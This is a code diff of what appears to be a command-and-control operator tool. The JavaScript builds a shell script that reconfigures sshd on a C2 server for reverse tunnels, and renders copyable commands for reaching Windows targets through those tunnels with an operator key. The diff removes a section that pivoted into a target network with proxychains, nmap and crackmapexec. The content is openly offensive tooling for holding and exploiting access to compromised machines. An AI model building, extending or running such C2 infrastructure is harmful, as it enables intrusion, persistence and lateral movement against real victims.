@@ -1244,7 +1244,6 @@ async function downloadC2Setup() {
 # ssh_user     : ${sshUser}
 # ports        : ${portsList}
 # tunnel_range : ${tunnelRange}
-# socks5       : ${socksPort}
 set -e
 
 SSH_USER="${sshUser}"
@@ -1269,13 +1268,8 @@ grep -qxF 'GatewayPorts yes'       /etc/ssh/sshd_config || \\
 
 
 echo "[*] Adding extra SSH listen ports (${portsList}) ..."
-# Anchor Port 22 explicitly first — adding any Port directive makes sshd stop
-# listening on the implicit default 22, so we must preserve it.
-grep -qxF "Port 22" /etc/ssh/sshd_config || \\
-    echo "Port 22" >> /etc/ssh/sshd_config
 for PORT in ${portsLoop}; do
-    [ "$PORT" -eq 22 ] && continue
-    grep -qxF "Port $PORT" /etc/ssh/sshd_config || \\
+    grep -qiE "^port[[:space:]]+$PORT$" /etc/ssh/sshd_config || \\
         echo "Port $PORT" >> /etc/ssh/sshd_config
 done
 
@@ -1394,16 +1388,8 @@ grep -oP 'Invalid user \\K\\S+\\.\\S+\\.p\\d+(?= from)' /var/log/auth.log | sort
 ssh &lt;win-user&gt;@localhost -p &lt;PORT&gt; -i operator_key</div>
    </div>
    <div class="ops-section">
-     <div class="ops-label">3. Route traffic through target network — SOCKS5 proxy</div>
-     <div class="cmd-block" onclick="copyCmd(this)" title="Click to copy"><span class="cmd-comment"># Add to /etc/proxychains4.conf:
-#   socks5  127.0.0.1  ${escHtml(p.socks_port||1080)}</span>
-
-proxychains4 nmap -sT -Pn 10.0.0.0/24
-proxychains4 crackmapexec smb 10.0.0.0/24</div>
-   </div>
-   <div class="ops-section">
      <div class="ops-label">C2 host</div>
-     <div class="cmd-block" onclick="copyCmd(this)" title="Click to copy">${escHtml(p.ssh_user)}@${escHtml(p.ssh_host)}  tunnel-range:${escHtml(p.tunnel_port_range)}  socks:${escHtml(p.socks_port||1080)}</div>
+     <div class="cmd-block" onclick="copyCmd(this)" title="Click to copy">${escHtml(p.ssh_user)}@${escHtml(p.ssh_host)}  tunnel-range:${escHtml(p.tunnel_port_range)}</div>
    </div>`;
 }
 
